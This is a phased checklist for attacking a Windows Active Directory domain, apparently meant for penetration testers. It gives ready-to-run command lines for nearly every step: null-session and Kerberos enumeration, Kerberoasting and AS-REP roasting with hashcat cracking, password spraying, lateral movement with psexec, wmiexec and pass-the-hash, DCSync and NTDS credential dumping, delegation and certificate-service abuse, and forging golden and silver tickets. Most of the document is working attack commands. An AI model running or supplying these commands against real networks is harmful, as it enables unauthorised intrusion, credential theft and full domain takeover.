# Active Directory Attack Checklist

## Phase 1 — Initial Enumeration (No Credentials)

- [ ] Scan for domain controllers: `nmap -p 53,88,135,139,389,445,636,3268,3269 TARGET_RANGE/24`
- [ ] Null session enumeration: `enum4linux -a DC_IP`
- [ ] Anonymous LDAP bind: `ldapsearch -x -H ldap://DC_IP -b "" -s base`
- [ ] RPC null session: `rpcclient -U "" -N DC_IP`
- [ ] SMB null session: `smbclient -L //DC_IP -N`
- [ ] Attempt zone transfer: `dig axfr DOMAIN @DC_IP`
- [ ] Username enumeration via Kerberos: `kerbrute userenum --dc DC_IP -d DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
- [ ] AS-REP Roasting (no creds): `impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -no-pass`

## Phase 2 — With Valid Credentials

### Enumeration
- [ ] Full domain enum: `bloodhound-python -u USER -p PASS -d DOMAIN -dc DC -c All`
- [ ] Load into BloodHound GUI → Find shortest path to Domain Admin
- [ ] User enumeration: `crackmapexec smb DC_IP -u USER -p PASS --users`
- [ ] Group enumeration: `crackmapexec smb DC_IP -u USER -p PASS --groups`
- [ ] Share enumeration: `crackmapexec smb DC_IP -u USER -p PASS --shares`
- [ ] Password policy: `crackmapexec smb DC_IP -u USER -p PASS --pass-pol`
- [ ] LDAP enum: `ldapsearch -x -H ldap://DC_IP -D "USER@DOMAIN" -w PASS -b "dc=domain,dc=com"`

### Kerberos Attacks
- [ ] Kerberoasting: `impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.txt`
- [ ] Crack TGS: `hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`
- [ ] AS-REP Roasting: `impacket-GetNPUsers DOMAIN/USER:PASS -dc-ip DC_IP -request`
- [ ] Crack AS-REP: `hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt`

### Password Spraying
- [ ] `crackmapexec smb DC_IP -u users.txt -p "Password123!" --no-brute`
- [ ] `crackmapexec smb DC_IP -u users.txt -p "Season2026!" --no-brute`
- [ ] `kerbrute passwordspray --dc DC_IP -d DOMAIN users.txt "Password123!"`
- [ ] **Note:** Check lockout policy first! Leave gaps between sprays.

### Credential Hunting
- [ ] Check shares for passwords: `crackmapexec smb DC_IP -u USER -p PASS -M spider_plus`
- [ ] Group Policy Preferences: `crackmapexec smb DC_IP -u USER -p PASS -M gpp_password`
- [ ] LAPS passwords: `crackmapexec ldap DC_IP -u USER -p PASS -M laps`

## Phase 3 — Lateral Movement

- [ ] Test creds on other hosts: `crackmapexec smb TARGET_RANGE/24 -u USER -p PASS`
- [ ] WinRM access: `crackmapexec winrm TARGET_RANGE/24 -u USER -p PASS`
- [ ] PSExec: `impacket-psexec DOMAIN/USER:PASS@TARGET`
- [ ] WMIExec: `impacket-wmiexec DOMAIN/USER:PASS@TARGET`
- [ ] Evil-WinRM: `evil-winrm -i TARGET -u USER -p PASS`
- [ ] Pass the Hash: `crackmapexec smb TARGET -u USER -H HASH`
- [ ] RDP: `xfreerdp /v:TARGET /u:DOMAIN\\USER /p:PASS /cert-ignore`

## Phase 4 — Privilege Escalation to Domain Admin

### Credential Dumping
- [ ] SAM dump: `impacket-secretsdump USER:PASS@TARGET`
- [ ] DCSync: `impacket-secretsdump DOMAIN/USER:PASS@DC_IP -just-dc`
- [ ] NTDS.dit extraction (if DA): `impacket-secretsdump DOMAIN/ADMIN:PASS@DC_IP -just-dc-ntlm`

### Delegation Attacks
- [ ] Unconstrained delegation: Check BloodHound for hosts with unconstrained delegation
- [ ] Constrained delegation: `impacket-getST -spn SERVICE/TARGET -impersonate administrator DOMAIN/USER:PASS`
- [ ] Resource-based constrained delegation (RBCD)

### ACL Abuse
- [ ] Check BloodHound for:
  - GenericAll / GenericWrite on users/groups/computers
  - WriteDACL on domain
  - ForceChangePassword
  - AddMember on privileged groups
  - WriteOwner

### Other Paths
- [ ] DNSAdmins group abuse
- [ ] Backup Operators abuse
- [ ] Print spooler abuse (PrintNightmare)
- [ ] ADCS (Active Directory Certificate Services) abuse: `certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP`
- [ ] Shadow Credentials
- [ ] NoPac / sAMAccountName spoofing

## Phase 5 — Domain Admin Post-Exploitation

- [ ] Golden Ticket: `impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN adminuser`
- [ ] Silver Ticket: `impacket-ticketer -nthash SERVICE_HASH -domain-sid SID -domain DOMAIN -spn SERVICE/HOST adminuser`
- [ ] DCSync all hashes: `impacket-secretsdump DOMAIN/ADMIN:PASS@DC_IP -just-dc-ntlm`
- [ ] Dump LSASS on all machines
- [ ] Extract all credentials for report
